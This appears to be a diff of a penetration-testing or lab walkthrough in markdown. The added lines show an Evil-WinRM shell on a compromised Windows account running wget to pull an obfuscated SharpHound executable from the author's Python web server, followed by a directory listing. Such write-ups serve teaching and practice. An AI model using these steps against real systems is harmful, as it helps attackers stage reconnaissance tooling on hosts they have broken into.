@@ -510,6 +510,19 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Ill host sharphound using a python webserver
 
 ```python
+*Evil-WinRM* PS C:\Users\svc_webpool\Documents> wget http://192.168.211.2:8000/SharpHound.exe._obf.exe -o obf_sharphound.exe
+*Evil-WinRM* PS C:\Users\svc_webpool\Documents> dir
+
+
+    Directory: C:\Users\svc_webpool\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/8/2026   6:39 PM         734720 obf_sharphound.exe
+
+
+*Evil-WinRM* PS C:\Users\svc_webpool\Documents> 
 
 ```
 I have now transferred it to my machine
